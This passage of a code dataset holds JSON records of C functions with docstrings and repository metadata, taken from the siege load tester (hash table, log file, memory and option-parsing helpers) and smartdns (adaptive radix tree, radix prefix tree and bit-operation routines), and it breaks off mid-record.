{"docstring": "/**\n * Destroy the hash table and free\n * memory which was allocated to it.\n */\n", "func_signal": "HASH\nhash_destroy(HASH this)", "code": "{\n  int x;\n  NODE *t1, *t2;\n\n  if (this == NULL) {\n    return this;\n  } \n\n  if (this->free == NULL) {\n    this->free = free;\n  }\n\n  for (x = 0; x < this->size; x++) {\n    t1 = this->table[x];\n    while (t1 != NULL) {\n      t2 = t1->next;\n      if (t1->key != NULL)\n        xfree(t1->key);\n      if (t1->val != NULL)\n        this->free(t1->val);\n      xfree(t1);\n      t1 = t2;      \n    } \n    this->table[x] = NULL;\n  }\n  if (this->table != NULL) {\n    xfree(this->table);\n    memset(this, '\\0', sizeof(struct HASH_T));\n  } \n  xfree(this);\n  return NULL;\n}", "path": "siege/src/hash.c", "commit_date": "2017-02-08 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * Removes and element from the hash; if\n * a function wasn't assigned, then it uses\n * free. You can assign an alternative method\n * using hash_remover or assign it in advance\n * with hash_set_destroyer\n */\n", "func_signal": "void\nhash_remove(HASH this, char *key)", "code": "{\n  int   x  = 0;\n  NODE *n1 = NULL;\n  NODE *n2 = NULL;\n\n  if (__lookup(this, key) == FALSE)\n    return;\n\n  if (this->free == NULL) {\n    this->free = free;\n  }\n\n  x  = __genkey(this->size, key);\n  n1 = this->table[x];\n  while (n1 != NULL) {\n    n2 = n1->next;\n    if (n1->key != NULL) {\n      xfree(n1->key);\n      this->entries--;\n    }\n    if (n1->val != NULL)\n      this->free(n1->val);\n    xfree(n1);\n    n1 = n2;\n  }\n  this->table[x] = NULL;\n}", "path": "siege/src/hash.c", "commit_date": "2017-02-08 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * return TRUE upon the successful\n * creation of the file, FALSE if not.  The\n * function adds a header at the top of the\n * file, format is comma separated text for\n * spreadsheet import.\n */\n", "func_signal": "BOOLEAN\ncreate_logfile(const char *file)", "code": "{\n  int     fd;\n  size_t  len  = 0;\n  BOOLEAN ret  = TRUE;\n  char   *head = (char*)\"      Date & Time,  Trans,  Elap Time,  Data Trans,  \"\n         \"Resp Time,  Trans Rate,  Throughput,  Concurrent,    OKAY,   Failed\\n\"; \n \n  if ((fd = open(file, O_CREAT | O_WRONLY, 0644)) < 0) {\n    return FALSE;\n  }\n\n  /* write the header to the file */\n  len = write(fd, head, strlen(head));\n  if (len == (unsigned int)-1) {\n    ret = FALSE;\n    switch (errno) {\n      case EBADF:\n        NOTIFY(ERROR, \"Unable to create log file (bad file descriptor): %s\", my.logfile);\n        break;\n      case EINTR:\n        NOTIFY(ERROR, \"Unable to create log file (system interrupt): %s\", my.logfile);\n        break;\n      default:\n        NOTIFY(ERROR, \"Unable to create log file (unknown error): %s\", my.logfile);\n        break;\n    }\n  }\n  close(fd);\n  return ret;\n}", "path": "siege/src/log.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/* Check the command line for the presence of the -R or --RC switch.  We\n * need to do this seperately from the other command line switches because\n * the options are initialized from the .siegerc file before the command line\n * switches are parsed. The argument index is reset before leaving the\n * function. */\n", "func_signal": "void \nparse_rc_cmdline(int argc, char *argv[])", "code": "{\n  int a = 0;\n  strcpy(my.rc, \"\");\n  \n  while( a > -1 ){\n    a = getopt_long(argc, argv, \"VhvqCDNFpgl::ibr:t:f:d:c:m:H:R:A:T:j\", long_options, (int*)0);\n    if(a == 'R'){\n      strcpy(my.rc, optarg);\n      a = -1;\n    }\n  }\n  optind = 0;\n}", "path": "siege/src/main.c", "commit_date": "2020-02-10 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/** \n * free() wrapper:\n * free it and NULL it to ensure we\n * don't free it a second time...\n */\n", "func_signal": "void\nxfree(void *ptr)", "code": "{\n  if(ptr!=(void *)NULL){\n    free(ptr); ptr=(void *)NULL;\n  }\n}", "path": "siege/src/memory.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * xcalloc     replaces calloc\n */\n", "func_signal": "void *\nxcalloc(size_t num, size_t size)", "code": "{\n  void *tmp  =  xmalloc(num * size);\n  memset(tmp, 0, (num * size));\n  return tmp;\n}", "path": "siege/src/memory.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * display_version   \n * displays the version number and exits on boolean false. \n * continue running? TRUE=yes, FALSE=no\n * return void\n */\n", "func_signal": "void \ndisplay_version(BOOLEAN b)", "code": "{\n  /**\n   * version_string is defined in version.c \n   * adding it to a separate file allows us\n   * to parse it in configure.  \n   */\n  char name[128]; \n\n  memset(name, 0, sizeof name);\n  strncpy(name, program_name, strlen(program_name));\n\n  if(my.debug){\n    fprintf(stderr,\"%s %s: debugging enabled\\n\\n%s\\n\", uppercase(name, strlen(name)), version_string, copyright);\n  } else {\n    if(b == TRUE){\n      fprintf(stderr,\"%s %s\\n\\n%s\\n\", uppercase(name, strlen(name)), version_string, copyright);\n      exit(EXIT_SUCCESS);\n    } else {\n      fprintf(stderr,\"%s %s\\n\", uppercase(name, strlen(name)), version_string);\n    }\n  }\n}", "path": "siege/src/main.c", "commit_date": "2020-02-10 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/* marks the siege.log with a user defined \n   message.  checks for the existence of a\n   log and creates one if not found.      */\n", "func_signal": "void\nmark_log_file(char *message)", "code": "{\n  int    fd;\n  size_t len;\n  char   entry[512];\n\n  /* if the file does NOT exist then create it.  */\n  if (!file_exists(my.logfile)) {\n    if (!create_logfile(my.logfile)) {\n      NOTIFY(ERROR, \"unable to create log file: %s\", my.logfile);\n      return;\n    }\n  }\n\n  /* create the log file entry */\n  snprintf(entry, sizeof entry, \"**** %s ****\\n\", message);\n\n  if ((fd = open( my.logfile, O_WRONLY | O_APPEND, 0644 )) < 0) {\n    NOTIFY(ERROR, \"Unable to write to file: %s\", my.logfile);\n  }\n\n  len = write(fd, entry, strlen(entry));\n  if (len == (unsigned int)-1) {\n    switch (errno) {\n      case EBADF:\n        NOTIFY(ERROR, \"Unable to mark log file (bad file descriptor): %s\", my.logfile);\n        break;\n      case EINTR:\n        NOTIFY(ERROR, \"Unable to mark log file (system interrupt): %s\", my.logfile);\n        break;\n      default:\n        NOTIFY(ERROR, \"Unable to mark log file (unknown error): %s\", my.logfile);\n        break;\n    }\n  }\n  close(fd);\n  return; \n}", "path": "siege/src/log.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/* end of parse_cmdline */\n", "func_signal": "private void\n__signal_setup()", "code": "{\n  sigset_t sigs;\n\n  sigemptyset(&sigs);\n  sigaddset(&sigs, SIGHUP);\n  sigaddset(&sigs, SIGINT);\n  sigaddset(&sigs, SIGALRM);\n  sigaddset(&sigs, SIGTERM);\n  sigaddset(&sigs, SIGPIPE);\n  sigprocmask(SIG_BLOCK, &sigs, NULL);\n}", "path": "siege/src/main.c", "commit_date": "2020-02-10 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/** \n * Ignores comment lines beginning with \n * '#' empty lines beginning with \\n \n * Takes a char* as an argument        \n */\n", "func_signal": "void \nparse(char *str)", "code": "{\n  char *ch;\n  char *sp;\n  char *sl;\n\n  /**\n   * An indented comment could be problematic.\n   * Let's trim the string then see if the first\n   * character is a comment.\n   */\n  str = trim(str);\n  if (str[0] == '#') { \n    str[0] = '\\0';\n  }\n\n  sp = strchr(str, ' ');\n  sl = strchr(str, '/');\n  if (sl==NULL && sp != NULL) {\n    ch = (char *)strstr(str, \"#\"); \n    if (ch) {*ch = '\\0';}\n  }\n  ch = (char *)strstr(str, \"\\n\"); \n  if (ch) {*ch = '\\0';}\n\n  trim(str);\n}", "path": "siege/src/cfg.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * Constructs an empty hash map with an initial \n * capacity of 10240 entries.\n */\n", "func_signal": "HASH \nnew_hash()", "code": "{\n  HASH this;\n  int  size = 10240;\n  this = calloc(HASHSIZE,1);\n  this->size    = size;\n  this->entries = 0;\n  this->index   = 0;\n  while (this->size < size) {\n    this->size <<= 1;\n  }\n  this->table  = (NODE**)calloc(this->size * sizeof(NODE*), 1);\n  this->free   = NULL;\n  return this;\n}", "path": "siege/src/hash.c", "commit_date": "2017-02-08 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * writes the output from siege to a formatted\n * log file.  checks if the log exists, if not\n * it creates a new formatted file and appends\n * text to it.  If a file does exist,  then it\n * simply appends to it. \n */\n", "func_signal": "void\nlog_transaction(DATA D)", "code": "{\n  write_to_log(\n    data_get_count(D),\n    data_get_elapsed(D),\n    data_get_megabytes(D),\n    data_get_total(D),\n    data_get_code(D),\n    my.failed\n  );\n  return;\n}", "path": "siege/src/log.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * returns TRUE if the file exists,\n */\n", "func_signal": "BOOLEAN\nfile_exists(char *file)", "code": "{\n  int  fd;\n\n  /* open the file read only  */\n  if((fd = open(file, O_RDONLY)) < 0){\n  /* the file does NOT exist  */\n    close(fd);\n    return FALSE;\n  } else {\n  /* party on Garth... */\n    close(fd);\n    return TRUE;\n  }\n\n  return FALSE;\n}", "path": "siege/src/log.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * returns TRUE if key is present in the table\n * and FALSE if it is not.\n */\n", "func_signal": "private BOOLEAN\n__lookup(HASH this, char *key)", "code": "{\n  int  x;\n  NODE *node;\n\n  if (key == NULL) { return FALSE; }\n  x = __genkey(this->size, key);\n  for (node = this->table[x]; node != NULL; node = node->next) {\n    if (!strcmp(node->key, key)) {\n      return TRUE;\n    }\n  }\n  return FALSE;\n}", "path": "siege/src/hash.c", "commit_date": "2017-02-08 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * add a key value pair to the hash table.\n * This function tests the size of the table\n * and dynamically resizes it as necessary.\n * len is the size of void pointer.\n */\n", "func_signal": "void\nhash_add(HASH this, char *key, void *val)", "code": "{\n  size_t len = 0;\n  if (__lookup(this, key) == TRUE)\n    return; \n\n  len = strlen(val);\n  hash_nadd(this, key, val, len);\n  return;\n}", "path": "siege/src/hash.c", "commit_date": "2017-02-08 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * xrealloc: value added realloc\n */\n", "func_signal": "void * \nxrealloc(void *ptr, size_t size)", "code": "{\n  void *tmp;\n  if (ptr) {\n    tmp = realloc(ptr, size);\n  } else {\n    tmp = malloc(size);\n  }\n  if (tmp==NULL) NOTIFY(FATAL, \"Memory exhausted; unable to continue.\");\n  return tmp;\n}", "path": "siege/src/memory.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * maps a file to our address space \n * and returns it the calling function.\n */\n", "func_signal": "void\nload_file(URL U, char *file)", "code": "{\n  FILE     *fp;\n  size_t   len;\n  char     *buf;\n  char     *filename;\n  char     mode[8];\n\n  filename = trim(file);\n\n  memset(mode, '\\0', sizeof(mode));\n  snprintf(mode, sizeof(mode), \"%s\", (is_ascii(filename))?\"r\":\"rb\");\n  fp = fopen(filename, mode);\n  if (! fp) {\n    NOTIFY(ERROR, \"unable to open file: %s\", filename );\n    return;\n  }\n \n  fseek(fp, 0, SEEK_END);\n  len = ftell(fp);\n  fseek(fp, 0, SEEK_SET);\n  buf = (char *)xmalloc(len+1);\n\n  if ((fread(buf, 1, len, fp )) == len) {\n    if (is_ascii(filename)) {\n      buf[len] = '\\0';\n      trim(buf);\n      len = strlen(buf);\n    }\n  } else {\n    NOTIFY(ERROR, \"unable to read file: %s\", filename );\n  }\n  fclose(fp); \n\n  if (len > 0) {\n    if (! empty(my.conttype)) {\n      // We're overriding the content-type at the cmd line\n      url_set_conttype(U, my.conttype);\n    } else {\n      url_set_conttype(U, get_content_type(filename));\n    }\n    url_set_postdata(U, buf, len);\n  } \n\n  xfree(buf);\n  return;\n}", "path": "siege/src/load.c", "commit_date": "2018-08-16 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "// Recursively destroys the tree\n", "func_signal": "static void destroy_node(art_node *n)", "code": "{\n    // Break if null\n    if (!n) return;\n\n    // Special case leafs\n    if (IS_LEAF(n)) {\n        free(LEAF_RAW(n));\n        return;\n    }\n\n    // Handle each node type\n    int i, idx;\n    union {\n        art_node4 *p1;\n        art_node16 *p2;\n        art_node48 *p3;\n        art_node256 *p4;\n    } p;\n    switch (n->type) {\n        case NODE4:\n            p.p1 = (art_node4*)n;\n            for (i=0;i<n->num_children;i++) {\n                destroy_node(p.p1->children[i]);\n            }\n            break;\n\n        case NODE16:\n            p.p2 = (art_node16*)n;\n            for (i=0;i<n->num_children;i++) {\n                destroy_node(p.p2->children[i]);\n            }\n            break;\n\n        case NODE48:\n            p.p3 = (art_node48*)n;\n            for (i=0;i<256;i++) {\n                idx = ((art_node48*)n)->keys[i]; \n                if (!idx) continue; \n                destroy_node(p.p3->children[idx-1]);\n            }\n            break;\n\n        case NODE256:\n            p.p4 = (art_node256*)n;\n            for (i=0;i<256;i++) {\n                if (p.p4->children[i])\n                    destroy_node(p.p4->children[i]);\n            }\n            break;\n\n        default:\n            abort();\n    }\n\n    // Free ourself on the way up\n    free(n);\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Calculates the index at which the prefixes mismatch\n */\n", "func_signal": "static int prefix_mismatch(const art_node *n, const unsigned char *key, int key_len, int depth)", "code": "{\n    int max_cmp = min(min(MAX_PREFIX_LEN, n->partial_len), key_len - depth);\n    int idx;\n    for (idx=0; idx < max_cmp; idx++) {\n        if (n->partial[idx] != key[depth+idx])\n            return idx;\n    }\n\n    // If the prefix is short we can avoid finding a leaf\n    if (n->partial_len > MAX_PREFIX_LEN) {\n        // Prefix is longer than what we've checked, find a leaf\n        art_leaf *l = minimum(n);\n        max_cmp = min(l->key_len, key_len)- depth;\n        for (; idx < max_cmp; idx++) {\n            if (l->key[idx+depth] != key[depth+idx])\n                return idx;\n        }\n    }\n    return idx;\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Searches for a value in the ART tree\n * @arg t The tree\n * @arg key The key\n * @arg key_len The length of the key\n * @return NULL if the item was not found, otherwise\n * the value pointer is returned.\n */\n", "func_signal": "void* art_search(const art_tree *t, const unsigned char *key, int key_len)", "code": "{\n    art_node **child;\n    art_node *n = t->root;\n    int prefix_len, depth = 0;\n    while (n) {\n        // Might be a leaf\n        if (IS_LEAF(n)) {\n            n = (art_node*)LEAF_RAW(n);\n            // Check if the expanded path matches\n            if (!leaf_matches((art_leaf*)n, key, key_len, depth)) {\n                return ((art_leaf*)n)->value;\n            }\n            return NULL;\n        }\n\n        // Bail if the prefix does not match\n        if (n->partial_len) {\n            prefix_len = check_prefix(n, key, key_len, depth);\n            if (prefix_len != min(MAX_PREFIX_LEN, n->partial_len))\n                return NULL;\n            depth = depth + n->partial_len;\n        }\n\n        // Recursively search\n        child = find_child(n, key[depth]);\n        n = (child) ? *child : NULL;\n        depth++;\n    }\n    return NULL;\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Initializes an ART tree\n * @return 0 on success.\n */\n", "func_signal": "int art_tree_init(art_tree *t)", "code": "{\n    t->root = NULL;\n    t->size = 0;\n    return 0;\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "// Find the minimum leaf under a node\n", "func_signal": "static art_leaf* minimum(const art_node *n)", "code": "{\n    // Handle base cases\n    if (!n) return NULL;\n    if (IS_LEAF(n)) return LEAF_RAW(n);\n\n    int idx;\n    switch (n->type) {\n        case NODE4:\n            return minimum(((const art_node4*)n)->children[0]);\n        case NODE16:\n            return minimum(((const art_node16*)n)->children[0]);\n        case NODE48:\n            idx=0;\n            while (!((const art_node48*)n)->keys[idx]) idx++;\n            idx = ((const art_node48*)n)->keys[idx] - 1;\n            return minimum(((const art_node48*)n)->children[idx]);\n        case NODE256:\n            idx=0;\n            while (!((const art_node256*)n)->children[idx]) idx++;\n            return minimum(((const art_node256*)n)->children[idx]);\n        default:\n            abort();\n    }\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/*\n * Originally from MRT lib/mrt/prefix.c\n * $MRTId: prefix.c,v 1.1.1.1 2000/08/14 18:46:11 labovit Exp $\n */\n", "func_signal": "static int\ncomp_with_mask(unsigned char *addr, unsigned char *dest, unsigned int mask)", "code": "{\n\tif (memcmp(addr, dest, mask / 8) == 0) {\n\t\tunsigned int n = mask / 8;\n\t\tunsigned int m = ((~0) << (8 - (mask % 8)));\n\n\t\tif (mask % 8 == 0 || (addr[n] & m) == (dest[n] & m))\n\t\t\treturn (1);\n\t}\n\treturn (0);\n}", "path": "smartdns/src/lib/radix.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "// Find the maximum leaf under a node\n", "func_signal": "static art_leaf* maximum(const art_node *n)", "code": "{\n    // Handle base cases\n    if (!n) return NULL;\n    if (IS_LEAF(n)) return LEAF_RAW(n);\n\n    int idx;\n    switch (n->type) {\n        case NODE4:\n            return maximum(((const art_node4*)n)->children[n->num_children-1]);\n        case NODE16:\n            return maximum(((const art_node16*)n)->children[n->num_children-1]);\n        case NODE48:\n            idx=255;\n            while (!((const art_node48*)n)->keys[idx]) idx--;\n            idx = ((const art_node48*)n)->keys[idx] - 1;\n            return maximum(((const art_node48*)n)->children[idx]);\n        case NODE256:\n            idx=255;\n            while (!((const art_node256*)n)->children[idx]) idx--;\n            return maximum(((const art_node256*)n)->children[idx]);\n        default:\n            abort();\n    }\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Returns the number of prefix characters shared between\n * the key and node.\n */\n", "func_signal": "static int check_prefix(const art_node *n, const unsigned char *key, int key_len, int depth)", "code": "{\n    int max_cmp = min(min(n->partial_len, MAX_PREFIX_LEN), key_len - depth);\n    int idx;\n    for (idx=0; idx < max_cmp; idx++) {\n        if (n->partial[idx] != key[depth+idx])\n            return idx;\n    }\n    return idx;\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * hweightN - returns the hamming weight of a N-bit word\n * @x: the word to weigh\n *\n * The Hamming Weight of a number is the total number of bits set in it.\n */\n", "func_signal": "unsigned int __sw_hweight32(unsigned int w)", "code": "{\n#ifdef CONFIG_ARCH_HAS_FAST_MULTIPLIER\n\tw -= (w >> 1) & 0x55555555;\n\tw =  (w & 0x33333333) + ((w >> 2) & 0x33333333);\n\tw =  (w + (w >> 4)) & 0x0f0f0f0f;\n\treturn (w * 0x01010101) >> 24;\n#else\n\tunsigned int res = w - ((w >> 1) & 0x55555555);\n\tres = (res & 0x33333333) + ((res >> 2) & 0x33333333);\n\tres = (res + (res >> 4)) & 0x0F0F0F0F;\n\tres = res + (res >> 8);\n\treturn (res + (res >> 16)) & 0x000000FF;\n#endif\n}", "path": "smartdns/src/lib/bitops.c", "commit_date": "2019-12-14 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Destroys an ART tree\n * @return 0 on success.\n */\n", "func_signal": "int art_tree_destroy(art_tree *t)", "code": "{\n    destroy_node(t->root);\n    return 0;\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Allocates a node of the given type,\n * initializes to zero and sets the type.\n */\n", "func_signal": "static art_node* alloc_node(uint8_t type)", "code": "{\n    art_node* n;\n\tvoid *mem = NULL;\n\tswitch (type) {\n        case NODE4:\n            mem = (art_node*)calloc(1, sizeof(art_node4));\n            break;\n        case NODE16:\n            mem = (art_node*)calloc(1, sizeof(art_node16));\n            break;\n        case NODE48:\n            mem = (art_node*)calloc(1, sizeof(art_node48));\n            break;\n        case NODE256:\n            mem = (art_node*)calloc(1, sizeof(art_node256));\n            break;\n        default:\n            abort();\n    }\n    if (mem == NULL) {\n\t\tabort();\n\t}\n\tn = mem;\n\tn->type = type;\n    return n;\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/*\n * Find the first cleared bit in a memory region.\n */\n", "func_signal": "unsigned long find_first_zero_bit(const unsigned long *addr, unsigned long size)", "code": "{\n\tunsigned long idx;\n\n\tfor (idx = 0; idx * BITS_PER_LONG < size; idx++) {\n\t\tif (addr[idx] != ~0UL)\n\t\t\treturn min(idx * BITS_PER_LONG + ffz(addr[idx]), size);\n\t}\n\n\treturn size;\n}", "path": "smartdns/src/lib/bitops.c", "commit_date": "2019-12-14 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Checks if a leaf prefix matches\n * @return 0 on success.\n */\n", "func_signal": "static int leaf_prefix_matches(const art_leaf *n, const unsigned char *prefix, int prefix_len)", "code": "{\n    // Fail if the key length is too short\n    if (n->key_len < (uint32_t)prefix_len) return 1;\n\n    // Compare the keys\n    return memcmp(n->key, prefix, prefix_len);\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/*\n * Find the first set bit in a memory region.\n */\n", "func_signal": "unsigned long find_first_bit(const unsigned long *addr, unsigned long size)", "code": "{\n\tunsigned long idx;\n\n\tfor (idx = 0; idx * BITS_PER_LONG < size; idx++) {\n\t\tif (addr[idx])\n\t\t\treturn min(idx * BITS_PER_LONG + __ffs(addr[idx]), size);\n\t}\n\n\treturn size;\n}", "path": "smartdns/src/lib/bitops.c", "commit_date": "2019-12-14 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/*\n * if func is supplied, it will be called as func(node->data)\n * before deleting the node\n */\n", "func_signal": "static void\nClear_Radix(radix_tree_t *radix, rdx_cb_t func, void *cbctx)", "code": "{\n\tif (radix->head) {\n\t\tradix_node_t *Xstack[RADIX_MAXBITS + 1];\n\t\tradix_node_t **Xsp = Xstack;\n\t\tradix_node_t *Xrn = radix->head;\n\n\t\twhile (Xrn) {\n\t\t\tradix_node_t *l = Xrn->l;\n\t\t\tradix_node_t *r = Xrn->r;\n\n\t\t\tif (Xrn->prefix) {\n\t\t\t\tDeref_Prefix(Xrn->prefix);\n\t\t\t\tif (Xrn->data && func)\n\t\t\t\t\tfunc(Xrn, cbctx);\n\t\t\t}\n\t\t\tfree(Xrn);\n\t\t\tradix->num_active_node--;\n\n\t\t\tif (l) {\n\t\t\t\tif (r)\n\t\t\t\t\t*Xsp++ = r;\n\t\t\t\tXrn = l;\n\t\t\t} else if (r) {\n\t\t\t\tXrn = r;\n\t\t\t} else if (Xsp != Xstack) {\n\t\t\t\tXrn = *(--Xsp);\n\t\t\t} else {\n\t\t\t\tXrn = (radix_node_t *) 0;\n\t\t\t}\n\t\t}\n\t}\n}", "path": "smartdns/src/lib/radix.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Iterates through the entries pairs in the map,\n * invoking a callback for each that matches a given prefix.\n * The call back gets a key, value for each and returns an integer stop value.\n * If the callback returns non-zero, then the iteration stops.\n * @arg t The tree to iterate over\n * @arg prefix The prefix of keys to read\n * @arg prefix_len The length of the prefix\n * @arg cb The callback function to invoke\n * @arg data Opaque handle passed to the callback\n * @return 0 on success, or the return of the callback.\n */\n", "func_signal": "int art_iter_prefix(art_tree *t, const unsigned char *key, int key_len, art_callback cb, void *data)", "code": "{\n    art_node **child;\n    art_node *n = t->root;\n    int prefix_len, depth = 0;\n    while (n) {\n        // Might be a leaf\n        if (IS_LEAF(n)) {\n            n = (art_node*)LEAF_RAW(n);\n            // Check if the expanded path matches\n            if (!leaf_prefix_matches((art_leaf*)n, key, key_len)) {\n                art_leaf *l = (art_leaf*)n;\n                return cb(data, (const unsigned char*)l->key, l->key_len, l->value);\n            }\n            return 0;\n        }\n\n        // If the depth matches the prefix, we need to handle this node\n        if (depth == key_len) {\n            art_leaf *l = minimum(n);\n            if (!leaf_prefix_matches(l, key, key_len))\n               return recursive_iter(n, cb, data);\n            return 0;\n        }\n\n        // Bail if the prefix does not match\n        if (n->partial_len) {\n            prefix_len = prefix_mismatch(n, key, key_len, depth);\n\n            // Guard if the mis-match is longer than the MAX_PREFIX_LEN\n            if ((uint32_t)prefix_len > n->partial_len) {\n                prefix_len = n->partial_len;\n            }\n\n            // If there is no match, search is terminated\n            if (!prefix_len) {\n                return 0;\n\n            // If we've matched the prefix, iterate on this node\n            } else if (depth + prefix_len == key_len) {\n                return recursive_iter(n, cb, data);\n            }\n\n            // if there is a full match, go deeper\n            depth = depth + n->partial_len;\n        }\n\n        // Recursively search\n        child = find_child(n, key[depth]);\n        n = (child) ? *child : NULL;\n        depth++;\n    }\n    return 0;\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/* Local additions */\n", "func_signal": "static void\nsanitise_mask(unsigned char *addr, unsigned int masklen, unsigned int maskbits)", "code": "{\n\tunsigned int i = masklen / 8;\n\tunsigned int j = masklen % 8;\n\n\tif (j != 0) {\n\t\taddr[i] &= (~0) << (8 - j);\n\t\ti++;\n\t}\n\tfor (; i < maskbits / 8; i++)\n\t\taddr[i] = 0;\n}", "path": "smartdns/src/lib/radix.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/**\n * Checks if a leaf matches\n * @return 0 on success.\n */\n", "func_signal": "static int leaf_matches(const art_leaf *n, const unsigned char *key, int key_len, int depth)", "code": "{\n    (void)depth;\n    // Fail if the key lengths are different\n    if (n->key_len != (uint32_t)key_len) return 1;\n\n    // Compare the keys starting at the depth\n    return memcmp(n->key, key, key_len);\n}", "path": "smartdns/src/lib/art.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/* if inclusive != 0, \"best\" may be the given prefix itself */\n", "func_signal": "static radix_node_t\n*radix_search_best2(radix_tree_t *radix, prefix_t *prefix, int inclusive)", "code": "{\n\tradix_node_t *node;\n\tradix_node_t *stack[RADIX_MAXBITS + 1] = {0};\n\tunsigned char *addr;\n\tunsigned int bitlen;\n\tint cnt = 0;\n\n\tif (radix->head == NULL)\n\t\treturn (NULL);\n\n\tnode = radix->head;\n\taddr = prefix_touchar(prefix);\n\tbitlen = prefix->bitlen;\n\n\twhile (node->bit < bitlen) {\n\t\tif (node->prefix)\n\t\t\tstack[cnt++] = node;\n\t\tif (BIT_TEST(addr[node->bit >> 3], 0x80 >> (node->bit & 0x07)))\n\t\t\tnode = node->r;\n\t\telse\n\t\t\tnode = node->l;\n\n\t\tif (node == NULL)\n\t\t\tbreak;\n\t}\n\n\tif (inclusive && node && node->prefix)\n\t\tstack[cnt++] = node;\n\n\n\tif (cnt <= 0)\n\t\treturn (NULL);\n\n\twhile (--cnt >= 0) {\n\t\tnode = stack[cnt];\n\t\tif (comp_with_mask(prefix_touchar(node->prefix),\n\t\t    